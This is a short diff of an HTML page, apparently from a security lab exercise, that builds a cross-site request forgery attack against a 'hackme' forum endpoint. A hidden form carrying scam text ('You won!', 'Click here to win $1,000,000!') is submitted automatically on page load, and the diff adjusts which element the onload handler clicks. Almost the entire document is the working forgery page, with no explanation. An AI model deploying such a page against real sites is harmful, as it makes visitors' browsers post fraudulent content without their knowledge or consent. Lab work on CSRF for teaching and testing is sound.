@@ -4,12 +4,12 @@
 		<meta charset="UTF-8">
 		<title>Nothing to See Here, Just an Image</title>
 	</head>
-	<body onload="document.getElementById('submit').click()">
+	<body onload="document.getElementById('form').click()">
 		<h1>Having a nice day?</h1>
-		<form action="http://infosec-020-104/hackme/post.php" method="post" target="body">
+		<form id="form" action="http://infosec-020-104/hackme/post.php" method="post" target="body">
 			<input type="hidden" name="title" value="You won!">
 			<input type="hidden" name="message" value="You have been selected for a free flying dragon ride.">
-			<input id="submit" type="hidden" name="post_submit" value="Click here to win $1,000,000!">
+			<input type="hidden" name="post_submit" value="Click here to win $1,000,000!">
 		</form>
 	</body>
 </html>
